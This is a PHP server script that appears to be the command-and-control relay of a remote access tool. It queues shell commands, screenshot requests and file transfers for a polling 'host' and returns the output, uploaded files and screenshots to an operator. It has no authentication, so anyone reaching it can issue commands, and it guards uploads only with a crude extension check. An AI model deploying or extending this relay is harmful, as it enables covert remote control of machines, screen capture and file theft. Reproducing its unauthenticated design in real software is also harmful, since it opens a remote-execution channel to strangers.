<?php

//directory in which are stored all server-side files
$dir = 'server/';
//create it if not exists
if(!file_exists($dir))
	mkdir($dir);

//function for downloading files
function download_file($filename){
	header('HTTP/1.1 200 OK');
	header('Status: 200 OK');
	header('Accept-Ranges: bytes');
	header('Content-Type: application/force-download');
	header('Content-Transfer-Encoding: Binary');
	header('Content-Length: ' . filesize($filename));
	header('Content-Disposition: attachment; filename="' . basename($filename) . '"');
	@readfile($filename);
}

//function for uploading files
function upload_file($uploaddir, $postparam){
	if(isset($_FILES[$postparam]) && is_uploaded_file($_FILES[$postparam]['tmp_name'])){
		//check if extension is .php
		foreach(explode('.', $_FILES[$postparam]['name']) as $el){ if( $el === 'php' ) die(); }
		$filepath = $uploaddir . '/' . basename($_FILES[$postparam]['name']);
		if(move_uploaded_file($_FILES[$postparam]['tmp_name'], $filepath))
			unlink($_FILES[$postparam]['tmp_name']);
	}
}

//host asking for commands
if(isset($_GET['getcmd'])){
	if(file_exists($dir . 'command.json'))
		echo file_get_contents($dir . 'command.json');
	//command not set, print "OK" and leave host in idle status
	else
		echo 'OK';
}

//getting screenshot status by checking "scr.png" and screenshot date and time info file
else if(isset($_GET['screenshotstatus'])){
	//checking for image file
	if(file_exists($dir . 'scr.png')){
		//checking for config file
		if(file_exists($dir . 'scrtime.cfg'))
			echo file_get_contents($dir . 'scrtime.cfg');
		else
			echo 'Error: config file not found';
	}
	else
		echo 'Error: screenshot file not found';
}

//client sending commands
else if(isset($_GET['setcmd'])){
	$command = $_GET['setcmd'];
	//if status or screenshot (commands with no params), just write command JSON file with command
	if(($command === 'status') || ($command === 'screenshot'))
		file_put_contents($dir . 'command.json', json_encode([$command, '']));
	//if shell or getfile, write command + param on JSON command file
	else if($command === 'shell')
		file_put_contents($dir . 'command.json', json_encode([$command, $_POST['command']]));
	else if($command === 'getfile')
		file_put_contents($dir . 'command.json', json_encode([$command, $_POST['filepath']]));
	else if($command === 'sendfile'){
		//upload file from "file" multipart form POST param
		upload_file($dir, 'file');
		//store filename on server (index 0) and destination path on client (index 1) on an array, and store array as second parameter of command JSON file
		file_put_contents($dir . 'command.json', json_encode([$command, [basename($_FILES['file']['name']), $_POST['filepath']]]));
	}
}

//client downloading file received through getfile command
else if(isset($_GET['getfile'])){
	//if response JSON file exists download file by retrieving its path from "response" field in JSON file, print error otherwise
	if(file_exists($dir . 'response.json')){
		download_file($dir . json_decode(file_get_contents($dir . 'response.json'), true)['response']);
		foreach(scandir($dir) as $ls){
			if(($ls !== 'scr.png') && ($ls !== 'scrtime.cfg'))
				unlink($dir . $ls);
		}
	}
	else
		echo 'Error: config file not found';
}

//host downloading file sent by client through sendfile command
else if(isset($_GET['sendfile'])){
	//if command JSON file exists download file by retrieving its name in JSON file, print error otherwise
	if(file_exists($dir . 'command.json'))
		download_file($dir . json_decode(file_get_contents($dir . 'command.json'), true)[1][0]);
	else
		echo 'Error: config file not found';
}

//host sending command output after execution
else if(isset($_GET['respcmd'])){
	//if file sent via HTTP POST, upload it to server directory
	if(isset($_FILES['file']))
		upload_file($dir, 'file');
	//create JSON response file with all HTTP POST params
	file_put_contents($dir . 'response.json', json_encode($_POST));
	//remove command JSON file to avoid command re-execution
	unlink($dir . 'command.json');
}

//retrieving response for client	
else if(isset($_GET['getresp'])){
	$command = $_GET['getresp'];
	//if response is not ready, just send "Processing" to client
	if(!file_exists($dir . 'response.json'))
		die('Processing');
	//if command is status, send JSON response data unparsed
	if($command === 'status')
		echo file_get_contents($dir . 'response.json');
	else{
		//parse response JSON file
		$response = json_decode(file_get_contents($dir . 'response.json'), true);
		//if command is shell, getfile, or sendfile, just print response
		if(($command === 'shell') || ($command === 'getfile') || ($command === 'sendfile'))
			echo $response['response'];
		//if command is screenshot
		else if($command === 'screenshot'){
			//write screenshot time/date to a config file
			file_put_contents($dir . 'scrtime.cfg', $response['time']);
			//print time as response
			echo $response['time'];
		}
	}
	//if command is getfile, delete files after download
	if(($command !== 'getfile') || ($response['response'] === 'Error: file not found')){
		//delete all temp files from server directory
		foreach(scandir($dir) as $ls){
			//keep latest screenshot image and date/time files
			if(($ls !== 'scr.png') && ($ls !== 'scrtime.cfg'))
				unlink($dir . $ls);
		}
	}
}

?>
